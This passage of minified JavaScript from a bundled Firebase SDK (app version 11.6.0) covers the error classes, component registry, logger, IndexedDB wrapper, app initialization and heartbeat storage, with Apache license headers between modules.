t=!0;const r="validate-browser-context-for-indexeddb-analytics-module",i=self.indexedDB.open(r);i.onsuccess=()=>{i.result.close(),t||self.indexedDB.deleteDatabase(r),n(!0)},i.onupgradeneeded=()=>{t=!1},i.onerror=()=>{var s;e(((s=i.error)===null||s===void 0?void 0:s.message)||"")}}catch(t){e(t)}})}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const _5="FirebaseError";class gs extends Error{constructor(e,t,r){super(t),this.code=e,this.customData=r,this.name=_5,Object.setPrototypeOf(this,gs.prototype),Error.captureStackTrace&&Error.captureStackTrace(this,lh.prototype.create)}}class lh{constructor(e,t,r){this.service=e,this.serviceName=t,this.errors=r}create(e,...t){const r=t[0]||{},i=`${this.service}/${e}`,s=this.errors[e],o=s?E5(s,r):"Error",a=`${this.serviceName}: ${o} (${i}).`;return new gs(i,a,r)}}function E5(n,e){return n.replace(I5,(t,r)=>{const i=e[r];return i!=null?String(i):`<${r}?>`})}const I5=/\{\$([^}]+)}/g;function S5(n){for(const e in n)if(Object.prototype.hasOwnProperty.call(n,e))return!1;return!0}function ia(n,e){if(n===e)return!0;const t=Object.keys(n),r=Object.keys(e);for(const i of t){if(!r.includes(i))return!1;const s=n[i],o=e[i];if(KE(s)&&KE(o)){if(!ia(s,o))return!1}else if(s!==o)return!1}for(const i of r)if(!t.includes(i))return!1;return!0}function KE(n){return n!==null&&typeof n=="object"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ch(n){const e=[];for(const[t,r]of Object.entries(n))Array.isArray(r)?r.forEach(i=>{e.push(encodeURIComponent(t)+"="+encodeURIComponent(i))}):e.push(encodeURIComponent(t)+"="+encodeURIComponent(r));return e.length?"&"+e.join("&"):""}function Vc(n){const e={};return n.replace(/^\?/,"").split("&").forEach(r=>{if(r){const[i,s]=r.split("=");e[decodeURIComponent(i)]=decodeURIComponent(s)}}),e}function Fc(n){const e=n.indexOf("?");if(!e)return"";const t=n.indexOf("#",e);return n.substring(e,t>0?t:void 0)}function T5(n,e){const t=new A5(n,e);return t.subscribe.bind(t)}class A5{constructor(e,t){this.observers=[],this.unsubscribes=[],this.observerCount=0,this.task=Promise.resolve(),this.finalized=!1,this.onNoObservers=t,this.task.then(()=>{e(this)}).catch(r=>{this.error(r)})}next(e){this.forEachObserver(t=>{t.next(e)})}error(e){this.forEachObserver(t=>{t.error(e)}),this.close(e)}complete(){this.forEachObserver(e=>{e.complete()}),this.close()}subscribe(e,t,r){let i;if(e===void 0&&t===void 0&&r===void 0)throw new Error("Missing Observer.");b5(e,["next","error","complete"])?i=e:i={next:e,error:t,complete:r},i.next===void 0&&(i.next=wm),i.error===void 0&&(i.error=wm),i.complete===void 0&&(i.complete=wm);const s=this.unsubscribeOne.bind(this,this.observers.length);return this.finalized&&this.task.then(()=>{try{this.finalError?i.error(this.finalError):i.complete()}catch{}}),this.observers.push(i),s}unsubscribeOne(e){this.observers===void 0||this.observers[e]===void 0||(delete this.observers[e],this.observerCount-=1,this.observerCount===0&&this.onNoObservers!==void 0&&this.onNoObservers(this))}forEachObserver(e){if(!this.finalized)for(let t=0;t<this.observers.length;t++)this.sendOne(t,e)}sendOne(e,t){this.task.then(()=>{if(this.observers!==void 0&&this.observers[e]!==void 0)try{t(this.observers[e])}catch(r){typeof console<"u"&&console.error&&console.error(r)}})}close(e){this.finalized||(this.finalized=!0,e!==void 0&&(this.finalError=e),this.task.then(()=>{this.observers=void 0,this.onNoObservers=void 0}))}}function b5(n,e){if(typeof n!="object"||n===null)return!1;for(const t of e)if(t in n&&typeof n[t]=="function")return!0;return!1}function wm(){}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function bn(n){return n&&n._delegate?n._delegate:n}class sa{constructor(e,t,r){this.name=e,this.instanceFactory=t,this.type=r,this.multipleInstances=!1,this.serviceProps={},this.instantiationMode="LAZY",this.onInstanceCreated=null}setInstantiationMode(e){return this.instantiationMode=e,this}setMultipleInstances(e){return this.multipleInstances=e,this}setServiceProps(e){return this.serviceProps=e,this}setInstanceCreatedCallback(e){return this.onInstanceCreated=e,this}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Po="[DEFAULT]";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class x5{constructor(e,t){this.name=e,this.container=t,this.component=null,this.instances=new Map,this.instancesDeferred=new Map,this.instancesOptions=new Map,this.onInitCallbacks=new Map}get(e){const t=this.normalizeInstanceIdentifier(e);if(!this.instancesDeferred.has(t)){const r=new c5;if(this.instancesDeferred.set(t,r),this.isInitialized(t)||this.shouldAutoInitialize())try{const i=this.getOrInitializeService({instanceIdentifier:t});i&&r.resolve(i)}catch{}}return this.instancesDeferred.get(t).promise}getImmediate(e){var t;const r=this.normalizeInstanceIdentifier(e==null?void 0:e.identifier),i=(t=e==null?void 0:e.optional)!==null&&t!==void 0?t:!1;if(this.isInitialized(r)||this.shouldAutoInitialize())try{return this.getOrInitializeService({instanceIdentifier:r})}catch(s){if(i)return null;throw s}else{if(i)return null;throw Error(`Service ${this.name} is not available`)}}getComponent(){return this.component}setComponent(e){if(e.name!==this.name)throw Error(`Mismatching Component ${e.name} for Provider ${this.name}.`);if(this.component)throw Error(`Component for ${this.name} has already been provided`);if(this.component=e,!!this.shouldAutoInitialize()){if(C5(e))try{this.getOrInitializeService({instanceIdentifier:Po})}catch{}for(const[t,r]of this.instancesDeferred.entries()){const i=this.normalizeInstanceIdentifier(t);try{const s=this.getOrInitializeService({instanceIdentifier:i});r.resolve(s)}catch{}}}}clearInstance(e=Po){this.instancesDeferred.delete(e),this.instancesOptions.delete(e),this.instances.delete(e)}async delete(){const e=Array.from(this.instances.values());await Promise.all([...e.filter(t=>"INTERNAL"in t).map(t=>t.INTERNAL.delete()),...e.filter(t=>"_delete"in t).map(t=>t._delete())])}isComponentSet(){return this.component!=null}isInitialized(e=Po){return this.instances.has(e)}getOptions(e=Po){return this.instancesOptions.get(e)||{}}initialize(e={}){const{options:t={}}=e,r=this.normalizeInstanceIdentifier(e.instanceIdentifier);if(this.isInitialized(r))throw Error(`${this.name}(${r}) has already been initialized`);if(!this.isComponentSet())throw Error(`Component ${this.name} has not been registered yet`);const i=this.getOrInitializeService({instanceIdentifier:r,options:t});for(const[s,o]of this.instancesDeferred.entries()){const a=this.normalizeInstanceIdentifier(s);r===a&&o.resolve(i)}return i}onInit(e,t){var r;const i=this.normalizeInstanceIdentifier(t),s=(r=this.onInitCallbacks.get(i))!==null&&r!==void 0?r:new Set;s.add(e),this.onInitCallbacks.set(i,s);const o=this.instances.get(i);return o&&e(o,i),()=>{s.delete(e)}}invokeOnInitCallbacks(e,t){const r=this.onInitCallbacks.get(t);if(r)for(const i of r)try{i(e,t)}catch{}}getOrInitializeService({instanceIdentifier:e,options:t={}}){let r=this.instances.get(e);if(!r&&this.component&&(r=this.component.instanceFactory(this.container,{instanceIdentifier:k5(e),options:t}),this.instances.set(e,r),this.instancesOptions.set(e,t),this.invokeOnInitCallbacks(r,e),this.component.onInstanceCreated))try{this.component.onInstanceCreated(this.container,e,r)}catch{}return r||null}normalizeInstanceIdentifier(e=Po){return this.component?this.component.multipleInstances?e:Po:e}shouldAutoInitialize(){return!!this.component&&this.component.instantiationMode!=="EXPLICIT"}}function k5(n){return n===Po?void 0:n}function C5(n){return n.instantiationMode==="EAGER"}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class R5{constructor(e){this.name=e,this.providers=new Map}addComponent(e){const t=this.getProvider(e.name);if(t.isComponentSet())throw new Error(`Component ${e.name} has already been registered with ${this.name}`);t.setComponent(e)}addOrOverwriteComponent(e){this.getProvider(e.name).isComponentSet()&&this.providers.delete(e.name),this.addComponent(e)}getProvider(e){if(this.providers.has(e))return this.providers.get(e);const t=new x5(e,this);return this.providers.set(e,t),t}getProviders(){return Array.from(this.providers.values())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var Qe;(function(n){n[n.DEBUG=0]="DEBUG",n[n.VERBOSE=1]="VERBOSE",n[n.INFO=2]="INFO",n[n.WARN=3]="WARN",n[n.ERROR=4]="ERROR",n[n.SILENT=5]="SILENT"})(Qe||(Qe={}));const M5={debug:Qe.DEBUG,verbose:Qe.VERBOSE,info:Qe.INFO,warn:Qe.WARN,error:Qe.ERROR,silent:Qe.SILENT},N5=Qe.INFO,P5={[Qe.DEBUG]:"log",[Qe.VERBOSE]:"log",[Qe.INFO]:"info",[Qe.WARN]:"warn",[Qe.ERROR]:"error"},L5=(n,e,...t)=>{if(e<n.logLevel)return;const r=new Date().toISOString(),i=P5[e];if(i)console[i](`[${r}]  ${n.name}:`,...t);else throw new Error(`Attempted to log a message with an invalid logType (value: ${e})`)};class cv{constructor(e){this.name=e,this._logLevel=N5,this._logHandler=L5,this._userLogHandler=null}get logLevel(){return this._logLevel}set logLevel(e){if(!(e in Qe))throw new TypeError(`Invalid value "${e}" assigned to \`logLevel\``);this._logLevel=e}setLogLevel(e){this._logLevel=typeof e=="string"?M5[e]:e}get logHandler(){return this._logHandler}set logHandler(e){if(typeof e!="function")throw new TypeError("Value assigned to `logHandler` must be a function");this._logHandler=e}get userLogHandler(){return this._userLogHandler}set userLogHandler(e){this._userLogHandler=e}debug(...e){this._userLogHandler&&this._userLogHandler(this,Qe.DEBUG,...e),this._logHandler(this,Qe.DEBUG,...e)}log(...e){this._userLogHandler&&this._userLogHandler(this,Qe.VERBOSE,...e),this._logHandler(this,Qe.VERBOSE,...e)}info(...e){this._userLogHandler&&this._userLogHandler(this,Qe.INFO,...e),this._logHandler(this,Qe.INFO,...e)}warn(...e){this._userLogHandler&&this._userLogHandler(this,Qe.WARN,...e),this._logHandler(this,Qe.WARN,...e)}error(...e){this._userLogHandler&&this._userLogHandler(this,Qe.ERROR,...e),this._logHandler(this,Qe.ERROR,...e)}}const D5=(n,e)=>e.some(t=>n instanceof t);let GE,QE;function O5(){return GE||(GE=[IDBDatabase,IDBObjectStore,IDBIndex,IDBCursor,IDBTransaction])}function B5(){return QE||(QE=[IDBCursor.prototype.advance,IDBCursor.prototype.continue,IDBCursor.prototype.continuePrimaryKey])}const Xx=new WeakMap,iy=new WeakMap,e2=new WeakMap,vm=new WeakMap,uv=new WeakMap;function U5(n){const e=new Promise((t,r)=>{const i=()=>{n.removeEventListener("success",s),n.removeEventListener("error",o)},s=()=>{t(eo(n.result)),i()},o=()=>{r(n.error),i()};n.addEventListener("success",s),n.addEventListener("error",o)});return e.then(t=>{t instanceof IDBCursor&&Xx.set(t,n)}).catch(()=>{}),uv.set(e,n),e}function j5(n){if(iy.has(n))return;const e=new Promise((t,r)=>{const i=()=>{n.removeEventListener("complete",s),n.removeEventListener("error",o),n.removeEventListener("abort",o)},s=()=>{t(),i()},o=()=>{r(n.error||new DOMException("AbortError","AbortError")),i()};n.addEventListener("complete",s),n.addEventListener("error",o),n.addEventListener("abort",o)});iy.set(n,e)}let sy={get(n,e,t){if(n instanceof IDBTransaction){if(e==="done")return iy.get(n);if(e==="objectStoreNames")return n.objectStoreNames||e2.get(n);if(e==="store")return t.objectStoreNames[1]?void 0:t.objectStore(t.objectStoreNames[0])}return eo(n[e])},set(n,e,t){return n[e]=t,!0},has(n,e){return n instanceof IDBTransaction&&(e==="done"||e==="store")?!0:e in n}};function V5(n){sy=n(sy)}function F5(n){return n===IDBDatabase.prototype.transaction&&!("objectStoreNames"in IDBTransaction.prototype)?function(e,...t){const r=n.call(_m(this),e,...t);return e2.set(r,e.sort?e.sort():[e]),eo(r)}:B5().includes(n)?function(...e){return n.apply(_m(this),e),eo(Xx.get(this))}:function(...e){return eo(n.apply(_m(this),e))}}function z5(n){return typeof n=="function"?F5(n):(n instanceof IDBTransaction&&j5(n),D5(n,O5())?new Proxy(n,sy):n)}function eo(n){if(n instanceof IDBRequest)return U5(n);if(vm.has(n))return vm.get(n);const e=z5(n);return e!==n&&(vm.set(n,e),uv.set(e,n)),e}const _m=n=>uv.get(n);function W5(n,e,{blocked:t,upgrade:r,blocking:i,terminated:s}={}){const o=indexedDB.open(n,e),a=eo(o);return r&&o.addEventListener("upgradeneeded",l=>{r(eo(o.result),l.oldVersion,l.newVersion,eo(o.transaction),l)}),t&&o.addEventListener("blocked",l=>t(l.oldVersion,l.newVersion,l)),a.then(l=>{s&&l.addEventListener("close",()=>s()),i&&l.addEventListener("versionchange",u=>i(u.oldVersion,u.newVersion,u))}).catch(()=>{}),a}const $5=["get","getKey","getAll","getAllKeys","count"],H5=["put","add","delete","clear"],Em=new Map;function YE(n,e){if(!(n instanceof IDBDatabase&&!(e in n)&&typeof e=="string"))return;if(Em.get(e))return Em.get(e);const t=e.replace(/FromIndex$/,""),r=e!==t,i=H5.includes(t);if(!(t in(r?IDBIndex:IDBObjectStore).prototype)||!(i||$5.includes(t)))return;const s=async function(o,...a){const l=this.transaction(o,i?"readwrite":"readonly");let u=l.store;return r&&(u=u.index(a.shift())),(await Promise.all([u[t](...a),i&&l.done]))[0]};return Em.set(e,s),s}V5(n=>({...n,get:(e,t,r)=>YE(e,t)||n.get(e,t,r),has:(e,t)=>!!YE(e,t)||n.has(e,t)}));/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class q5{constructor(e){this.container=e}getPlatformInfoString(){return this.container.getProviders().map(t=>{if(K5(t)){const r=t.getImmediate();return`${r.library}/${r.version}`}else return null}).filter(t=>t).join(" ")}}function K5(n){const e=n.getComponent();return(e==null?void 0:e.type)==="VERSION"}const oy="@firebase/app",ZE="0.11.4";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const us=new cv("@firebase/app"),G5="@firebase/app-compat",Q5="@firebase/analytics-compat",Y5="@firebase/analytics",Z5="@firebase/app-check-compat",J5="@firebase/app-check",X5="@firebase/auth",eU="@firebase/auth-compat",tU="@firebase/database",nU="@firebase/data-connect",rU="@firebase/database-compat",iU="@firebase/functions",sU="@firebase/functions-compat",oU="@firebase/installations",aU="@firebase/installations-compat",lU="@firebase/messaging",cU="@firebase/messaging-compat",uU="@firebase/performance",hU="@firebase/performance-compat",fU="@firebase/remote-config",dU="@firebase/remote-config-compat",pU="@firebase/storage",gU="@firebase/storage-compat",mU="@firebase/firestore",yU="@firebase/vertexai",wU="@firebase/firestore-compat",vU="firebase",_U="11.6.0";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ay="[DEFAULT]",EU={[oy]:"fire-core",[G5]:"fire-core-compat",[Y5]:"fire-analytics",[Q5]:"fire-analytics-compat",[J5]:"fire-app-check",[Z5]:"fire-app-check-compat",[X5]:"fire-auth",[eU]:"fire-auth-compat",[tU]:"fire-rtdb",[nU]:"fire-data-connect",[rU]:"fire-rtdb-compat",[iU]:"fire-fn",[sU]:"fire-fn-compat",[oU]:"fire-iid",[aU]:"fire-iid-compat",[lU]:"fire-fcm",[cU]:"fire-fcm-compat",[uU]:"fire-perf",[hU]:"fire-perf-compat",[fU]:"fire-rc",[dU]:"fire-rc-compat",[pU]:"fire-gcs",[gU]:"fire-gcs-compat",[mU]:"fire-fst",[wU]:"fire-fst-compat",[yU]:"fire-vertex","fire-js":"fire-js",[vU]:"fire-js-all"};/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Uu=new Map,IU=new Map,ly=new Map;function JE(n,e){try{n.container.addComponent(e)}catch(t){us.debug(`Component ${e.name} failed to register with FirebaseApp ${n.name}`,t)}}function Dl(n){const e=n.name;if(ly.has(e))return us.debug(`There were multiple attempts to register component ${e}.`),!1;ly.set(e,n);for(const t of Uu.values())JE(t,n);for(const t of IU.values())JE(t,n);return!0}function hv(n,e){const t=n.container.getProvider("heartbeat").getImmediate({optional:!0});return t&&t.triggerHeartbeat(),n.container.getProvider(e)}function ii(n){return n==null?!1:n.settings!==void 0}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const SU={"no-app":"No Firebase App '{$appName}' has been created - call initializeApp() first","bad-app-name":"Illegal App name: '{$appName}'","duplicate-app":"Firebase App named '{$appName}' already exists with different options or config","app-deleted":"Firebase App named '{$appName}' already deleted","server-app-deleted":"Firebase Server App has been deleted","no-options":"Need to provide options, when not being deployed to hosting via source.","invalid-app-argument":"firebase.{$appName}() takes either no argument or a Firebase App instance.","invalid-log-argument":"First argument to `onLog` must be null or a function.","idb-open":"Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.","idb-get":"Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.","idb-set":"Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.","idb-delete":"Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}.","finalization-registry-not-supported":"FirebaseServerApp deleteOnDeref field defined but the JS runtime does not support FinalizationRegistry.","invalid-server-app-environment":"FirebaseServerApp is not for use in browser environments."},to=new lh("app","Firebase",SU);/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class TU{constructor(e,t,r){this._isDeleted=!1,this._options=Object.assign({},e),this._config=Object.assign({},t),this._name=t.name,this._automaticDataCollectionEnabled=t.automaticDataCollectionEnabled,this._container=r,this.container.addComponent(new sa("app",()=>this,"PUBLIC"))}get automaticDataCollectionEnabled(){return this.checkDestroyed(),this._automaticDataCollectionEnabled}set automaticDataCollectionEnabled(e){this.checkDestroyed(),this._automaticDataCollectionEnabled=e}get name(){return this.checkDestroyed(),this._name}get options(){return this.checkDestroyed(),this._options}get config(){return this.checkDestroyed(),this._config}get container(){return this._container}get isDeleted(){return this._isDeleted}set isDeleted(e){this._isDeleted=e}checkDestroyed(){if(this.isDeleted)throw to.create("app-deleted",{appName:this._name})}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ec=_U;function Op(n,e={}){let t=n;typeof e!="object"&&(e={name:e});const r=Object.assign({name:ay,automaticDataCollectionEnabled:!1},e),i=r.name;if(typeof i!="string"||!i)throw to.create("bad-app-name",{appName:String(i)});if(t||(t=Zx()),!t)throw to.create("no-options");const s=Uu.get(i);if(s){if(ia(t,s.options)&&ia(r,s.config))return s;throw to.create("duplicate-app",{appName:i})}const o=new R5(i);for(const l of ly.values())o.addComponent(l);const a=new TU(t,r,o);return Uu.set(i,a),a}function t2(n=ay){const e=Uu.get(n);if(!e&&n===ay&&Zx())return Op();if(!e)throw to.create("no-app",{appName:n});return e}function xd(){return Array.from(Uu.values())}function no(n,e,t){var r;let i=(r=EU[n])!==null&&r!==void 0?r:n;t&&(i+=`-${t}`);const s=i.match(/\s|\//),o=e.match(/\s|\//);if(s||o){const a=[`Unable to register library "${i}" with version "${e}":`];s&&a.push(`library name "${i}" contains illegal characters (whitespace or "/")`),s&&o&&a.push("and"),o&&a.push(`version name "${e}" contains illegal characters (whitespace or "/")`),us.warn(a.join(" "));return}Dl(new sa(`${i}-version`,()=>({library:i,version:e}),"VERSION"))}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const AU="firebase-heartbeat-database",bU=1,ju="firebase-heartbeat-store";let Im=null;function n2(){return Im||(Im=W5(AU,bU,{upgrade:(n,e)=>{switch(e){case 0:try{n.createObjectStore(ju)}catch(t){console.warn(t)}}}}).catch(n=>{throw to.create("idb-open",{originalErrorMessage:n.message})})),Im}async function xU(n){try{const t=(await n2()).transaction(ju),r=await t.objectStore(ju).get(r2(n));return await t.done,r}catch(e){if(e instanceof gs)us.warn(e.message);else{const t=to.create("idb-get",{originalErrorMessage:e==null?void 0:e.message});us.warn(t.message)}}}async function XE(n,e){try{const r=(await n2()).transaction(ju,"readwrite");await r.objectStore(ju).put(e,r2(n)),await r.done}catch(t){if(t instanceof gs)us.warn(t.message);else{const r=to.create("idb-set",{originalErrorMessage:t==null?void 0:t.message});us.warn(r.message)}}}function r2(n){return`${n.name}!${n.options.appId}`}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const kU=1024,CU=30;class RU{constructor(e){this.container=e,this._heartbeatsCache=null;const t=this.container.getProvider("app").getImmediate();this._storage=new NU(t),this._heartbeatsCachePromise=this._storage.read().then(r=>(this._heartbeatsCache=r,r))}async triggerHeartbeat(){var e,t;try{const i=this.container.getProvider("platform-logger").getImmediate().getPlatformInfoString(),s=eI();if(((e=this._heartbeatsCache)===null||e===void 0?void 0:e.heartbeats)==null&&(this._heartbeatsCache=await this._heartbeatsCachePromise,((t=this._heartbeatsCache)===null||t===void 0?void 0:t.heartbeats)==null)||this._heartbeatsCache.lastSentHeartbeatDate===s||this._heartbeatsCache.heartbeats.some(o=>o.date===s))return;if(this._heartbeatsCache.heartbeats.push({date:s,agent:i}),this._heartbeatsCache.heartbeats.length>CU){const o=PU(this._heartbeatsCache.heartbeats);this._heartbeatsCache.heartbeats.splice(o,1)}return this._storage.overwrite(this._heartbeatsCache)}catch(r){us.warn(r)}}async getHeartbeatsHeader(){var e;try{if(this._heartbeatsCache===null&&await this._heartbeatsCachePromise,((e=this._heartbeatsCache)===null||e===void 0?void 0:e.heartbeats)==null||this._heartbeatsCache.heartbeats.length===0)return"";const t=eI(),{heartbeatsToSend:r,unsentEntries:i}=MU(this._heartbeatsCache.heartbeats),s=bd(JSON.stringify({version:2,heartbeats:r}));return this._heartbeatsCache.lastSentHeartbeatDate=t,i.length>0?(this._heartbeatsCache.heartbeats=i,await this._storage.overwrite(this._heartbeatsCache)):(this._heartbeatsCache.heartbeats=[],this._storage.overwrite(this._heartbeatsCache)),s}catch(t){return us.warn(t),""}}}function eI(){return new Date().toISOString().substring(0,10)}function MU(n,e=kU){const t=[];let r=n.slice();for(const i of n){const s=t.find(o=>o.agent===i.agent);if(s){if(s.dates.push(i.date),tI(t)>e){s.dates.pop();break}}else if(t.push({agent:i.agent,dates:[i.date]}),tI(t)>e){t.pop();break}r=r.slice(1)}return{heartbeatsToSend:t,unsentEntries:r}}class NU{constructor(e){this.app=e,this._canUseIndexedDBPromise=this.runIndexedDBEnvironmentCheck()}async runIndexedDBEnvironmentCheck(){return w5()?v5().then(()=>!0).catch(()=>!1):!1}async read(){if(await this._canUseIndexedDBPromise){const t=await xU(this.app);return t!=null&&t.heartbeats?t:{heartbeats:[]}}else return{heartbeats:[]}}async overwrite(e){var t;if(await this._canUseIndexedDBPromise){const i=await this.read();return XE(this.app,{lastSentHeartbeatDate:(t=e.lastSentHeartbeatDate)!==null&&t!==void 0?t:i.lastSentHeartbeatDate,heartbeats:e.heartbeats})}else return}async add(e){var t;if(await this._canUseIndexedDBPromise){const i=await this.read();return XE(this.app,{lastSentHeartbeatDate:(t=e.lastSentHeartbeatDate)!==null&&t!==void 0?t:i.lastSentHeartbeatDate,heartbeats:[...i.heartbeats,...e.heartbeats]})}else return}}function tI(n){return bd(JSON.stringify({version:2,heartbeats:n})).length}function PU(n){if(n.length===0)return-1;let e=0,t=n[0].date;for(let r=1;r<n.length;r++)n[r].date<t&&(t=n[r].date,e=r);return e}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
